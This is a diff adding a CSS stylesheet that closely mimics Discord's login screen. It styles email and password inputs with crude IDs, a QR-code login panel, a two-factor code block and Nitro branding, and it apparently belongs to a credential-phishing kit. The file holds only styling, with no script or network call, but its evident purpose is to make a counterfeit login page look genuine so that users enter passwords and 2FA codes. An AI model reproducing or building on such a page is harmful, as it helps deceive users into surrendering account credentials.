@@ -1,0 +1,325 @@
+#emailfuck
+{
+    color: #8e9297;
+}
+
+#passfuck
+{
+    color: #8e9297;
+}
+
+#emailffuck
+{
+    border: 1px solid #222428;
+}
+
+#passffuck
+{
+    border: 1px solid #222428;
+}
+
+#emailffuck:hover
+{
+    border: 1px solid #00aff4;
+}
+
+#passffuck:hover
+{
+    border: 1px solid #00aff4;
+}
+
+@font-face {
+    font-family: 'Ginto';
+    src: url('../fonts/ginto.woff') format("truetype") ;
+}
+
+@font-face {
+    font-family: 'Whitney';
+    src: url('../fonts/whitney.woff') format("truetype") ;
+}
+
+
+body {
+    background: url("../images/discord.png") #5965f2;
+    background-size: cover;
+    user-select: none;
+}
+
+.block {
+    background: #36393f;
+    border-radius: 5px;
+
+    padding: 32px;
+
+    margin-top: 11rem;
+}
+
+.auth_block {
+    width: 784px;
+    min-height: 408px;
+    border-radius: 5px;
+}
+
+.two-factor_block {
+    /*height: 440.5px;*/
+    width: 480px;
+}
+
+.key-icon {
+    width: 124px;
+    height: 84px;
+    background: url("../images/key.svg");
+    margin-bottom: 20px;
+}
+
+.two-factor_block .input-discord {
+    margin-top: 40px;
+}
+
+.input-discord .font-italic {
+    font-size: 12px !important;
+    font-weight: 500;
+    line-height: 16px;
+    margin-left: 3px;
+}
+
+.auth_block .left-block {
+    width: 414px;
+}
+
+.ava {
+    width: 100px;
+    height: 100px;
+    border-radius: 50%;
+    margin-bottom: 20px;
+    background: url("../images/ava.png");
+    background-size: cover;
+}
+
+.auth_block .float-right {
+    width: 240px;
+}
+
+.auth_block .float-right .h1 {
+    margin-top: 32px;
+}
+
+.nitro-title .h1 {
+    line-height: 40px;
+}
+
+.nitro_icon {
+    background: url("../images/nitro.svg");
+    width: 40px;
+    height: 40px;
+    background-size: cover;
+    margin-right: 8px;
+}
+
+.auth_block .float-right .qr_code {
+    width: 176px;
+    height: 176px;
+    background: url("../images/qrnew.png") white;
+    border: 7px solid white;
+    background-size: cover;
+    border-radius: 4px;
+    margin-top: 100px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.auth_block .qr_code .icon {
+    width: 50px;
+    height: 50px;
+    background: url("../images/icon.png");
+    background-size: cover;
+}
+
+.auth_block .left-block .input-discord {
+    margin-top: 20px;
+}
+
+a {
+    font-size: 12px;
+    color: #00aff4;
+    font-weight: 600;
+}
+
+a:hover {
+    color: #00aff4 !important;
+}
+
+.h1 {
+    font-family: 'Ginto', sans-serif !important;
+    color: white;
+    font-size: 24px;
+    line-height: 30px;
+    letter-spacing: normal;
+}
+
+.h2 {
+    font-family: 'Whitney', sans-serif !important;
+    color: #b9bbbe;
+    font-size: 16px;
+    line-height: 20px;
+    letter-spacing: normal;
+    font-weight: 400;
+}
+
+.input-discord .h5 {
+    font-family: 'Ginto', sans-serif !important;
+    color: #8e9297;
+    font-size: 12px;
+    line-height: 16px;
+    letter-spacing: normal;
+    text-transform: uppercase;
+}
+
+input {
+    background: #313339;
+    border-radius: 3px;
+    border: 1px solid #222428;
+    width: 100%;
+    height: 40px;
+    padding: 10px;
+    font-size: 16px;
+    color: #dcddd3;
+    font-weight: 300;
+}
+
+button {
+    width: 100%;
+    background: #5865f2;
+    color: white;
+    font-size: 16px;
+    line-height: 23px;
+    height: 44px;
+    border: none;
+    border-radius: 3px;
+    margin-top: 20px;
+}
+
+.register_text {
+    font-size: 12px;
+    line-height: 16px;
+    color: #696d74;
+    font-weight: 300;
+    margin-top: 8px;
+}
+    .authBox-hW6HR{
+     position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    }
+
+@media all and (max-width: 784px) {
+    .auth_block, .auth_block .left-block {
+        width: 480px;
+    }
+
+    .auth_block .left-block {
+        width: 100%;
+    }
+
+    .auth_block .float-right {
+        display: none;
+    }
+}
+
+@media all and (max-width: 600px) {
+
+        .bbb{
+                padding-top: 30%!important;
+                width: inherit!important;
+                height: 100%!important;
+    }
+
+    body {
+        background: #36393f !important;
+    }
+
+    .auth_block {
+        width: auto;
+    }
+
+    .auth_block:before {
+        background: url('../images/authlogo.svg') no-repeat;
+        width: 130px;
+    }
+
+    .two-factor_block {
+        width: auto;
+    }
+
+    .block {
+    margin-top: 0;
+    position: absolute;
+    left: 0;
+    top: 50%;
+    transform: translate(0px, -50%);
+    width: -webkit-fill-available;
+    height: -webkit-fill-available;
+    border-radius: 0;
+    margin: -1px;
+    }
+}
+
+
+
+.lds-ellipsis {
+  display: inline-block;
+  position: relative;
+  width: 80px;
+  height: 80px;
+}
+.lds-ellipsis div {
+  position: absolute;
+  top: 33px;
+  width: 13px;
+  height: 13px;
+  border-radius: 50%;
+  background: #fff;
+  animation-timing-function: cubic-bezier(0, 1, 1, 0);
+}
+.lds-ellipsis div:nth-child(1) {
+  left: 8px;
+  animation: lds-ellipsis1 0.6s infinite;
+}
+.lds-ellipsis div:nth-child(2) {
+  left: 8px;
+  animation: lds-ellipsis2 0.6s infinite;
+}
+.lds-ellipsis div:nth-child(3) {
+  left: 32px;
+  animation: lds-ellipsis2 0.6s infinite;
+}
+.lds-ellipsis div:nth-child(4) {
+  left: 56px;
+  animation: lds-ellipsis3 0.6s infinite;
+}
+@keyframes lds-ellipsis1 {
+  0% {
+    transform: scale(0);
+  }
+  100% {
+    transform: scale(1);
+  }
+}
+@keyframes lds-ellipsis3 {
+  0% {
+    transform: scale(1);
+  }
+  100% {
+    transform: scale(0);
+  }
+}
+@keyframes lds-ellipsis2 {
+  0% {
+    transform: translate(0, 0);
+  }
+  100% {
+    transform: translate(24px, 0);
+  }
+}
